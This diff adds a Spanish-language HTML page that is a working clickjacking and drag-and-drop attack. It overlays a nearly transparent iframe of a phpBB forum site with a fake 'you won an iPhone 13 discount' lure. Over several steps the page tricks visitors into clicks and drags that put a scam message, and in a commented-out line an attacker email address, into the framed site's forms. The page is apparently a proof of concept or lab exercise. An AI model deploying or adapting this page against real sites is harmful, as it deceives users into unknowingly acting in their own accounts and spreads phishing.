@@ -1,0 +1,596 @@
+<html>
+  <head>
+    <meta content="text/html;charset=utf-8" http-equiv="Content-Type">
+    <meta content="utf-8" http-equiv="encoding">
+    <script type="text/javascript" src="http://ajax.googleapis.com/ajax/libs/jquery/1.6.4/jquery.min.js"></script>
+    <script defer>
+      $(document).ready(function(){
+        var MyConfObj = {
+          iframeMouseOver: false,
+        };
+        var counter = 0;
+        const iframe = document.getElementById("iframe");
+        iframe.addEventListener('load', function() {
+          if(MyConfObj.iframeMouseOver){
+            switch (counter) {
+              case 0:
+                document.getElementById("first-box").style.display = "none";
+                document.getElementById("click-text-1").style.display = "none";
+                document.getElementById("iframe").classList.remove("iframe-first");
+                document.getElementById("second-box").style.display = "block";
+                document.getElementById("click-button-2").style.display = "block";
+                document.getElementById("iframe").classList.add("iframe-second");
+                counter++;
+                break;
+              case 1:
+                document.getElementById("second-box").style.display = "none";
+                document.getElementById("click-button-2").style.display = "none";
+                document.getElementById("iframe").classList.remove("iframe-second");
+                document.getElementById("third-box").style.display = "block";
+                document.getElementById("drop-divs").style.display = "block";
+                document.getElementById("iframe").classList.add("iframe-third");
+                counter++;
+                break;
+              case 2:
+                document.getElementById("iframe").style.display = "none";
+                document.getElementById("fourth-box").style.display = "none";
+                document.getElementById("iphone-opacity-behind").style.display = "none";
+                document.getElementById("discount-opacity-behind").style.display = "none";
+                document.getElementById("button-fourth").style.display = "none";
+                document.getElementById("fifth-box").style.display = "block";
+                break;
+              
+              default:
+                break;
+            }
+            // MyConfObj.isEnd = true
+          }
+        },true);
+        document.getElementById('iframe').addEventListener('mouseover', function(){
+          MyConfObj.iframeMouseOver = true;
+        });
+        document.getElementById('iframe').addEventListener('mouseout', function(){
+          MyConfObj.iframeMouseOver = false;
+        });
+      });
+
+      var discountBool = false;
+      var iphoneBool = false;
+
+      function iphoneInput() {
+        if (!iphoneBool) {
+          document.getElementById("iphone-opacity-over").style.display = "none";
+          document.getElementById("iphone-opacity-behind").style.display = "block";
+        }
+        iphoneBool = true;
+        checkBoth();
+      }
+
+      function discountInput() {
+        if (!discountBool) {
+          document.getElementById("discount-opacity-over").style.display = "none";
+          document.getElementById("discount-opacity-behind").style.display = "block";
+        }
+        discountBool = true;
+        checkBoth();
+      }
+
+      function checkBoth() {
+        if (discountBool && iphoneBool) {
+          document.getElementById("discount-opacity-over").style.display = "none";
+          document.getElementById("discount-opacity-behind").style.display = "block";
+          document.getElementById("discount-opacity-behind").classList.remove("discount-opacity-second");
+          document.getElementById("discount-opacity-behind").classList.add("discount-opacity-third");
+          document.getElementById("iphone-opacity-over").style.display = "none";
+          document.getElementById("iphone-opacity-behind").style.display = "block";
+          document.getElementById("iphone-opacity-behind").classList.remove("iphone-opacity-second");
+          document.getElementById("iphone-opacity-behind").classList.add("iphone-opacity-third");
+          iframeFourth();
+        }
+      }
+
+      function iframeFourth() {
+        document.getElementById("third-box").style.display = "none";
+        document.getElementById("drop-divs").style.display = "none";
+        document.getElementById("iframe").classList.remove("iframe-third");
+        document.getElementById("iframe").classList.add("iframe-fourth");
+        document.getElementById("fourth-box").style.display = "block";
+        document.getElementById("button-fourth").style.display = "block";
+        counter++;
+      }
+    </script>
+    <style>
+      #payload{
+        position: absolute;
+        top: 20px;
+      }
+
+      #first-box .left-div #iphone {
+        width: 300px;
+        position: absolute;
+        top: 200px;
+        left: 150px;
+      }
+
+      #first-box .left-div #discount {
+        position: absolute;
+        width: 250px;
+        top: 400px;
+        left: 250px;
+      }
+
+      #first-box .right-div #iphone {
+        position: absolute;
+        width: 460px;
+        top: 100px;
+        left: 130px;
+      }
+
+      #first-box .right-div #discount {
+        position: absolute;
+        width: 250px;
+        top: 400px;
+        left: 330px;
+      }
+
+      #first-box .top-div {
+        width: 90%;
+        height: 310px;
+        position: absolute;
+        top: 0;
+      }
+
+      #first-box .bottom-div {
+        width: 90%;
+        height: 350px;
+        position: absolute;
+        bottom: 0;
+      }
+
+      #first-box .right-div {
+        height: 90vh;
+        right: 0;
+        position: absolute;
+        width: 700px;
+      }
+
+      #first-box .left-div {
+        height: 90vh;
+        left: 0;
+        position: absolute;
+        width: 680px;
+      }
+
+      #second-box .top-div {
+        width: 90%;
+        height: 367px;
+        position: absolute;
+        top: 0;
+      }
+
+      #second-box .bottom-div {
+        width: 90%;
+        height: 278px;
+        position: absolute;
+        bottom: 0;
+      }
+
+      #second-box .right-div {
+        height: 90vh;
+        right: 0;
+        position: absolute;
+        width: 684px;
+      }
+
+      #second-box .left-div {
+        height: 90vh;
+        left: 0;
+        position: absolute;
+        width: 654px;
+      }
+
+      #third-box .top-div {
+        width: 90%;
+        height: 283px;
+        position: absolute;
+        top: 0;
+      }
+
+      #third-box .bottom-div {
+        width: 90%;
+        height: 250px;
+        position: absolute;
+        bottom: 0;
+      }
+
+      #third-box .right-div {
+        height: 90vh;
+        right: 0;
+        position: absolute;
+        width: 631px;
+      }
+
+      #third-box .left-div {
+        height: 90vh;
+        left: 0;
+        position: absolute;
+        width: 648px;
+      }
+
+      #third-box .inside-div {
+        height: 96px;
+        left: 648px;
+        position: absolute;
+        width: 145px;
+        top: 305px;
+      }
+
+      #fourth-box .top-div {
+        width: 90%;
+        height: 555px;
+        position: absolute;
+        top: 0;
+      }
+
+      #fourth-box .bottom-div {
+        width: 90%;
+        height: 93px;
+        position: absolute;
+        bottom: 0;
+      }
+
+      #fourth-box .right-div {
+        height: 90vh;
+        right: 0;
+        position: absolute;
+        width: 675px;
+      }
+
+      #fourth-box .left-div {
+        height: 90vh;
+        left: 0;
+        position: absolute;
+        width: 663px;
+      }
+
+      .iframe-first {
+        width: 280px;
+        height: 100vh;
+        border: none;
+        position: absolute;
+        top: -65px;
+        left: 450px;
+        opacity:0.3
+      }
+
+      .iframe-second {
+        width: 280px;
+        height: 415px;
+        border: medium none;
+        position: absolute;
+        top: 60px;
+        left: 515px;
+        opacity: 0.3;
+      }
+
+      .iframe-third {
+        width: 280px;
+        height: 415px;
+        border: medium none;
+        position: absolute;
+        top: 60px;
+        left: 515px;
+        opacity: 0.3;
+      }
+
+      .iframe-fourth {
+        width: 310px;
+        height: 700px;
+        border: medium none;
+        position: absolute;
+        top: -75px;
+        left: 440px;
+        opacity: 0.3;
+      }
+
+      .xss{
+        position: fixed;
+        background: #F00;
+      }
+
+      .title {
+        margin-top: 2rem;
+        margin-bottom: 1rem;
+        font-size: 3rem;
+        margin-left: 100px;
+        text-align: center;
+        font-family: sans-serif;
+        color: #0066ff;
+      }
+
+      #click-text-1 {
+        font-family: sans-serif;
+        position: absolute;
+        top: 285px;
+        left: 643px;
+        text-align: center;
+      }
+
+      .click-text-span {
+        text-decoration: underline;
+        cursor: pointer;
+        color: blue;
+      }
+
+      input[type=text] {
+        width: 70%;
+        padding: 12px;
+        border: 1px solid #ccc;
+        border-radius: 4px;
+        box-sizing: border-box;
+        resize: vertical;
+        margin-bottom: 1rem;
+      }
+
+      #name-input {
+        position: absolute;
+        top: 215px;
+        left: 450px;
+      }
+
+      #email-input {
+        position: absolute;
+        top: 270px;
+        left: 450px;
+      }
+
+      #click-button-2 {
+        position: absolute;
+        top: 348px;
+        left: 636px;
+        background-color: #0066ff; /* Green */
+        border: none;
+        color: white;
+        padding: 20px;
+        text-align: center;
+        text-decoration: none;
+        margin: 4px 2px;
+        cursor: pointer;
+        border-radius: 2px;
+      }
+
+      #drop-divs {
+        position: absolute;
+        top: 285px;
+        left: 650px;
+        width: 125px;
+      }
+
+      #iphone-input {
+        width: 125px;
+        height: 18px;
+        text-align: center;
+        margin-bottom: 100px;
+        padding: 0 !important;
+        border-color: black;
+      }
+
+      #discount-input {
+        width: 125px;
+        height: 18px;
+        text-align: center;
+        margin-bottom: 100px;
+        padding: 0 !important;
+        border-color: black;
+      }
+
+      .iphone-opacity-first {
+        width: 400px;
+        position: relative;
+        top: 70px;
+        left: 100px;
+        opacity: 0.3;
+      }
+
+      .iphone-opacity-second {
+        position: absolute;
+        left: 465px;
+        top: 70px;
+        width: 400px;
+        opacity: 0.3;
+      }
+
+      .iphone-opacity-third {
+        position: absolute;
+        left: 465px;
+        top: 70px;
+        width: 400px;
+        opacity: 1;
+      }
+
+      .discount-opacity-first {
+        position: relative;
+        width: 300px;
+        opacity: 0.3;
+        top: 200px;
+        left: 150px;
+      }
+
+      .discount-opacity-second {
+        position: absolute;
+        top: 270px;
+        right: 369px;
+        left: -180px;
+        width: 300px;
+        opacity: 0.3;
+      }
+
+      .discount-opacity-third {
+        position: absolute;
+        top: 270px;
+        left: 600px;
+        width: 300px;
+        opacity: 1;
+      }
+
+      #button-fourth {
+        position: absolute;
+        bottom: 73px;
+        left: 653px;
+        background-color: #06F;
+        border: medium none;
+        color: #FFF;
+        padding: 20px;
+        text-align: center;
+        text-decoration: none;
+        margin: 4px 2px;
+        cursor: pointer;
+        border-radius: 2px;
+      }
+
+      .last-title {
+        margin-top: 2rem;
+        margin-bottom: 1rem;
+        font-size: 3rem;
+        text-align: center;
+        font-family: sans-serif;
+        color: #06F;
+      }
+
+      .last-iphone {
+        width: 300px;
+        position: absolute;
+        left: 500px;
+      }
+
+      .last-discount {
+        width: 250px;
+        position: absolute;
+        top: 350px;
+        left: 615px;
+      }
+    </style>
+  </head>
+  <body>
+    <p id="click-text-1">
+      Haz click<br>
+      <span class="click-text-span">aqui</span><br>
+      para continuar
+    </p>
+
+    <button id="click-button-2" style="display: none;">
+      Continuar
+    </button>
+
+    <div id="drop-divs" style="display: none;">
+      <input type="text" id="iphone-input" value="Iphone" readonly="true">
+      <input type="text" id="discount-input" value="Descuento" readonly="true">
+    </div>
+    
+    <img 
+      class="iphone-opacity-second"
+      style="display: none;"
+      id="iphone-opacity-behind"
+      src="./iphone-13-2.png">
+
+    <img 
+      class="iphone-opacity-second"
+      style="display: none;"
+      id="discount-opacity-behind"
+      src="./descuento2.jpg">
+
+    <button id="button-fourth" style="display: none;">
+      Recibir
+    </button>
+
+    <iframe 
+      sandbox="allow-modals allow-popups allow-forms allow-same-origin allow-scripts"
+      src="http://www.originalphpbb.com"
+      class="iframe-first"
+      id="iframe"
+    ></iframe>
+
+    <div id="first-box">
+      <div class="top-div">
+        <p class="title">
+          ¡Felicidades! Has ganado el descuento de usuarios para la compra de un Iphone 13.
+        </p>
+      </div>
+      <div class="right-div">
+        <img id="iphone" src="./iphone-13-2.png">
+        <img id="discount" src="./descuento2.jpg">
+      </div>
+      <div class="bottom-div"></div>
+      <div class="left-div">
+        <img id="iphone" src="./iphone13.png">
+        <img id="discount" src="./descuento2.jpg">
+      </div>
+    </div>
+
+    <div id="second-box" style="display: none;">
+      <div class="top-div">
+        <p class="title">
+          Completa los siguientes datos para obtener tu voucher.
+        </p>
+      </div>
+      <div class="right-div"></div>
+      <div class="bottom-div"></div>
+      <div class="left-div">
+        <input type="text" id="name-input" placeholder="Nombre completo">
+        <input type="text" id="email-input" placeholder="Email">
+      </div>
+    </div>
+
+    <div id="third-box" style="display: none;">
+      <div class="top-div">
+        <p class="title">
+          ¡Último paso! Une las piezas y presiona recibir para obtener tu voucher.
+        </p>
+      </div>
+      <div class="right-div">
+        <img 
+          draggable="true" ondragstart="event.dataTransfer
+            .setData('text/plain', 
+              'Haz ganado el sorteo de usuarios de originalphpbb y recibiras como premio un voucher de 80% de descuento por un nuevo iphone. Presiona el siguiente link (link) y sigue los pasos para obtenerlo.'
+            );"
+          ondragend="discountInput();"
+          id="discount-opacity-over"
+          class="discount-opacity-first" 
+          src="./descuento2.jpg">
+      </div>
+      <div class="bottom-div"></div>
+      <div class="left-div">
+        <img 
+          draggable="true" 
+          ondragstart="event.dataTransfer.setData('text/plain', 'Eres el ganador de un gran descuento.');"
+          ondragend="iphoneInput();"
+          class="iphone-opacity-first"
+          id="iphone-opacity-over"
+          src="./iphone-13-2.png">
+      </div>
+      <div class="inside-div"></div>
+    </div>
+
+    <div id="fourth-box" style="display: none;">
+      <div class="top-div">
+        <p class="title">
+          ¡Último paso! Une las piezas y presiona recibir para obtener tu voucher.
+        </p>
+      </div>
+      <div class="right-div"></div>
+      <div class="bottom-div"></div>
+      <div class="left-div"></div>
+    </div>
+
+    <div id="fifth-box" style="display: none;">
+      <div class="top-div">
+        <p class="last-title">
+          ¡Felicidades! En momentos recibiras tu voucher en tu casilla de correo!
+        </p>
+        <img class="last-iphone" src="./iphone13.png">
+        <img class="last-discount" src="./descuento2.jpg">
+      </div>
+    </div>
+    <!-- <div id="payload" draggable="true" ondragstart="event.dataTransfer.setData('text/plain', 'attacker@gmail.com')"><h3>2.DRAG ME TO THE RED BOX</h3></div> -->
+  </body>
+</html>
